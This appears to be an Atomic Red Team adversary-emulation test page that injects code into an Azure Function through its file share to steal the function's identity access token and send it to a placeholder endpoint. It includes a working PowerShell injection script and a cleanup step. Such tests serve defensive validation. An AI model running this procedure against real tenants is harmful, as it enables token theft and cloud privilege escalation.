---
atomic_guid: "67aaf4cb-54ce-42e2-ab56-e0a9bcc089b1"
title: "Azure - Functions code upload - Functions code injection via File Share modification to retrieve the Functions identity access token"
framework: "atomic"
generated: "true"
attack_technique_id: "T1528"
attack_technique_name: "Steal Application Access Token"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "67aaf4cb-54ce-42e2-ab56-e0a9bcc089b1"
  - "Azure - Functions code upload - Functions code injection via File Share modification to retrieve the Functions identity access token"
platforms:
  - "iaas:azure"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Azure - Functions code upload - Functions code injection via File Share modification to retrieve the Functions identity access token

This test injects code into an Azure Function (RCE) to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance.

Attack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/

Once executed, the "https://changeme" will retrieve the access token when the function app is executed on behalf of the tenant. The function may be triggered manually from authorized people, triggered in regular intervals, or in various other ways. The access token can then be used to perform further attack steps with the permissions that the function app holds (e.g. listening virtual machines).

Note: 
- The Azure Function modified in this test must be hosted via Azure Files in a File Share (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations).
- For Function code upload to Azure Functions that are hosted via Azure Blob storage, refer to T1528 "Azure - Functions code upload - Functions code injection via Blob upload".
- The required input fields can be retrieved in a reconnaissance step in test T1619 "Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI". The code of function apps may be inspected and prepared from the result of test T1530 "Azure - Dump Azure Storage Account Objects via Azure CLI".
- Important: Change the https://changeme.net in code_to_insert_path to a self-controlled endpoint. This endpoint can be hosted e.g. as request bin via Pipedream to display the body of incoming POST requests.
- The default injected code to retrieve the access token can be replaced by arbitrary other code. In this case: Replace the code defined in code_to_insert_path

Requirements:
- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.
- The EntraID user must have the role "Storage Account Contributor", or a role with similar permissions.

Execution options: Defined by the input field execution_option
- insert_code: This option (1) downloads the existing funciton code into a tmp file, (2) injects the code from code_to_insert_path at the beginning of the file, and (3) uploads the tampered file to the targeted Azure Function code (Azure File Share File).
- replace_file: This option uploads the function code defined in code_to_insert_path to the targeted Azure Function code (Azure File Share File).

## Metadata

- Atomic GUID: 67aaf4cb-54ce-42e2-ab56-e0a9bcc089b1
- Technique: T1528: Steal Application Access Token
- Platforms: iaas:azure
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1528/T1528.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1528-steal_application_access_token|T1528]]

## Input Arguments

### code_to_insert_path

- description: The code that will be injected into the Function
- type: path
- default: $PathToAtomicsFolder/T1528/src/code_to_insert.py

### execution_option

- description: Chooses execution option insert_code, or replace_file
- type: string
- default: insert_code

### file_path

- description: Path to the Function file in the file share
- type: path
- default: site/wwwroot/function_app.py

### file_share_name

- description: Name of the file share that is related to the Function
- type: string
- default: file_share_name_example

### storage_account_name

- description: Name of storage account that is related to the Function
- type: string
- default: storage_account_name_example

## Dependencies

Azure CLI must be installed

### Prerequisite Check

```powershell
try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
```

### Get Prerequisite

```powershell
Install-Module -Name Az -Force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
az login    # Log in to Azure CLI

$allowSharedKeyAccess = az storage account show --name "#{storage_account_name}" --query "allowSharedKeyAccess"

if ($allowSharedKeyAccess -eq "false") {    # $allowSharedKeyAccess could be true or null
    Write-Output "Shared key access is disabled for this storage account."
} else {
    # Download file for cleanup
    $tmpOriginalFileName = [System.IO.Path]::GetFileName("#{file_path}")
    $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1528_tmp_original_" + $tmpOriginalFileName)
    az storage file download --account-name "#{storage_account_name}" --share-name "#{file_share_name}" -p "#{file_path}" --only-show-errors --dest $tmpOriginalFunctionCode

    if ($LASTEXITCODE -eq 0) {
        # Upload new funciton code if download of existing code succeeded
        if ("#{execution_option}" -eq "insert_code") {
            # Download file from file share for injection
            $tmpFunctionCode = Join-Path $env:temp/ ("T1528_tmp_to_inject_" + $tmpOriginalFileName)
            az storage file download --account-name "#{storage_account_name}" --share-name "#{file_share_name}" -p "#{file_path}" --only-show-errors --dest $tmpFunctionCode
            
            if ($LASTEXITCODE -ne 0) {
                Write-Output "Function code download failed."
                exit 1
            }
            Write-Output "File downloaded: $($tmpFunctionCode)"
            
            $insertContent = Get-Content -Path "#{code_to_insert_path}" -Raw  # Load the content of the insert file
            
            $content = Get-Content -Path $tmpFunctionCode -Raw  # Inject code to file
            $content = $insertContent + "`n" + $content     # Insert the new code at the beginning
            $content | Set-Content -Path $tmpFunctionCode       # Write the modified content to the file
            
            # Upload file to file share
            az storage file upload --account-name "#{storage_account_name}" --share-name "#{file_share_name}" -p "#{file_path}" --source $tmpFunctionCode --only-show-errors
            if ($LASTEXITCODE -ne 0) {
                Write-Output "Function code upload failed."
                exit 1
            }
            Write-Output "Uploaded the tampered file"
        } elseif ("#{execution_option}" -eq "replace_file") {
            az storage file upload --account-name "#{storage_account_name}" --share-name "#{file_share_name}" -p "#{file_path}" --source "#{code_to_insert_path}" --only-show-errors
            if ($LASTEXITCODE -ne 0) {
                Write-Output "Function code upload failed."
                exit 1
            }
            Write-Output "Uploaded the tampered file"
        } else {
            Write-Output "Please choose a valid execution_option"
            exit 1
        }
    } else {
        Write-Output "Download original function code failed."
        exit 1
    }
}
```

### Cleanup

```powershell
az login    # Log in to Azure CLI

# Upload previous funciton code
$tmpOriginalFileName = [System.IO.Path]::GetFileName("#{file_path}")
$tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1528_tmp_original_" + $tmpOriginalFileName)
az storage file upload --account-name "#{storage_account_name}" --share-name "#{file_share_name}" -p "#{file_path}" --source $tmpOriginalFunctionCode --only-show-errors 2>$null

if ($LASTEXITCODE -eq 0) {
    Write-Output "Uploaded original version of function code."

    # Delete tmp original f file if upload succeeded
    if ("#{execution_option}" -eq "insert_code") {
        $tmpFunctionCode = Join-Path $env:temp/ ("T1528_tmp_to_inject_" + $tmpOriginalFileName)
        Remove-Item -Path $tmpFunctionCode -Force -erroraction silentlycontinue
        Write-Output "Deleted tmp file: $($tmpFunctionCode)"
    }

    # Delete tmp original file
    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue
    Write-Output "Deleted tmp original file: $($tmpOriginalFunctionCode)"
} else {
    Write-Output "Upload original function code failed."
}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.yaml)
